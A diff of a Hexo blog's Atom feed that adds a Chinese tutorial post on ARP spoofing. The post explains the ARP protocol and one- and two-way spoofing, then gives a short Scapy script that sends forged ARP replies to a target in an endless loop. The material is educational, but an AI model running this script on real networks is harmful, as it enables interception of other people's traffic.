@@ -18,8 +18,8 @@
   
   <entry>
     <title>黑客编程（一）：简易端口扫</title>
-    <link href="http://example.com/2023/12/15/New/"/>
-    <id>http://example.com/2023/12/15/New/</id>
+    <link href="http://example.com/2023/12/15/python(1)/"/>
+    <id>http://example.com/2023/12/15/python(1)/</id>
     <published>2023-12-14T16:00:00.000Z</published>
     <updated>2023-12-15T05:26:28.657Z</updated>
     
@@ -41,22 +41,26 @@
   </entry>
   
   <entry>
-    <title>Hello World</title>
-    <link href="http://example.com/2023/11/13/hello-world/"/>
-    <id>http://example.com/2023/11/13/hello-world/</id>
-    <published>2023-11-13T07:10:23.087Z</published>
-    <updated>2023-11-13T07:10:23.087Z</updated>
+    <title>黑客编程（二）：简单ARP欺骗</title>
+    <link href="http://example.com/2023/12/15/python(2)/"/>
+    <id>http://example.com/2023/12/15/python(2)/</id>
+    <published>2023-12-14T16:00:00.000Z</published>
+    <updated>2023-12-26T06:23:24.234Z</updated>
     
-    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
+    <content type="html"><![CDATA[<h1 id="黑客编程-—简单ARP欺骗"><a href="#黑客编程-—简单ARP欺骗" class="headerlink" title="黑客编程 —简单ARP欺骗"></a>黑客编程 —简单ARP欺骗</h1><p>前言：开发永远是最需要去学习的东西！对于网络安全来说更是如此，本末倒置的无脑脚本跑是没有任何技术的！！</p><h2 id="ARP欺骗是什么？"><a href="#ARP欺骗是什么？" class="headerlink" title="ARP欺骗是什么？"></a>ARP欺骗是什么？</h2><p>1.ARP协议工作过程<br>假设有两台主机A：192.168.1.1，B：192.168.1.2。当主机A要与主机B通信时，A首先会以广播的方式发送一个ARP请求包，该数据包包含了源IP（192.168.1.1），源MAC（A），目标IP（192.168.1.2），目标MAC（ff:ff:ff:ff:ff:ff）,B收到广播包后会先将A的IP与MAC地址记录到自己的ARP缓存表中，然后给A单播回复ARP replay包，该数据包包含了源IP（192.168.1.2），源MAC（B），目标IP（192.168.1.1），目标MAC（A），A收到该数据包后会将B的IP和MAC记录到自己的ARP缓存中，之后与B的通讯查询缓存即可。</p><p>2.ARP欺骗原理<br>由于ARP是无状态协议，所以当一台主机收到一个ARP响应包后不会检查自己是否发送过ARP请求，而是直接将该条记录加载到ARP缓存表中或更新原记录。这样就可以利用向目标主机发送大量的ARP响应包导致目标主机的ARP缓存一致处于错误记录状态，从而达到ARP欺骗目的</p><p>2.1单向欺骗<br>单向欺骗是只对目标主机或者网关发起ARP欺骗，攻击者只需要将自己伪装成网关或者一台主机向局域网内其他主机发送ARP响应报文即可</p><p>2.1双向欺骗<br>攻击者同时欺骗网关和目标主机，对网关说我是A，对A说我是网关，那么A与网关之间的流量都要经过攻击者的电脑，他们之间的数据也都将被攻击者截获。</p><h2 id="脚本详情（注释版）"><a href="#脚本详情（注释版）" class="headerlink" title="脚本详情（注释版）"></a>脚本详情（注释版）</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment">#一定要先下载scapy，可以用pip install scapy</span></span><br><span class="line"></span><br><span class="line">target_ip=<span class="string">&quot;目标ip&quot;</span></span><br><span class="line">target_mac=<span class="string">&quot;目标mac&quot;</span></span><br><span class="line"></span><br><span class="line">fake_ip=<span class="string">&quot;伪造ip&quot;</span></span><br><span class="line">fake_mac=<span class="string">&quot;伪造mac&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arp_spoof</span>():</span><br><span class="line">    arp=ARP()</span><br><span class="line">    <span class="comment">#创建一个ARP对象</span></span><br><span class="line">    <span class="comment">#设置ARP数据包的以下的设置</span></span><br><span class="line">    arp.psrc=fake_ip<span class="comment">#源IP</span></span><br><span class="line">    arp.pdst=target_ip<span class="comment">#目标IP</span></span><br><span class="line">    arp.hwsrc=fake_mac<span class="comment">#源MAC</span></span><br><span class="line">    arp.hwdst=target_mac<span class="comment">#目标MAC</span></span><br><span class="line">    pkt=arp<span class="comment">#将arp对象赋值给pkt变量</span></span><br><span class="line"></span><br><span class="line">    send(pkt)<span class="comment">#发包，进行欺骗</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:<span class="comment">#主函数的入口</span></span><br><span class="line">    i=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:<span class="comment">#进行死循环</span></span><br><span class="line">        time.sleep(<span class="number">1</span>)<span class="comment">#每次循环延时1秒</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;第&#123;&#125;次攻击&quot;</span>.<span class="built_in">format</span>(i))<span class="comment">#记录是第几次进攻</span></span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">        arp_spoof()<span class="comment">#调用上面的函数</span></span><br></pre></td></tr></table></figure>]]></content>
     
     
       
       
-    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
+    <summary type="html">&lt;h1 id=&quot;黑客编程-—简单ARP欺骗&quot;&gt;&lt;a href=&quot;#黑客编程-—简单ARP欺骗&quot; class=&quot;headerlink&quot; title=&quot;黑客编程 —简单ARP欺骗&quot;&gt;&lt;/a&gt;黑客编程 —简单ARP欺骗&lt;/h1&gt;&lt;p&gt;前言：开发永远是最需要去学习的东西！对于网络安全来说</summary>
       
     
     
     
+    <category term="blog" scheme="http://example.com/categories/blog/"/>
+    
+    
+    <category term="hexo" scheme="http://example.com/tags/hexo/"/>
     
   </entry>
   
